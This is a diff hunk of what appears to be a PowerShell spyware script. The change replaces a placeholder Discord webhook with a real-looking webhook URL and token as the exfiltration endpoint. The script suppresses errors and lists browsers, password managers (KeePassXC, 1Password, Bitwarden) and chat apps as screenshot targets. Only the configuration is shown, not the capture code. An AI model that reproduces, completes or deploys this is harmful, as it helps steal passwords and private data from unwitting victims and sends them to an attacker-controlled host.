@@ -1,7 +1,7 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
 # ======================= CONFIG =======================
-$Webhook     = "https://discord.com/api/webhooks/XXXXXXXX/YYYYYYYY"
+$Webhook     = "https://discord.com/api/webhooks/1569542381072814221/6QObZS_5JMHMQOJ3y_Pog5PyLgiesDP-uaC802RQTSY5afaU20eZTa9CqcsNXjIbwZif"
 # Foreground process names to screenshot. "*" = everything.
 $ShotProcs   = @("chrome","msedge","firefox","brave","opera","vivaldi",
                  "keepassxc","1password","bitwarden","discord","slack","teams",
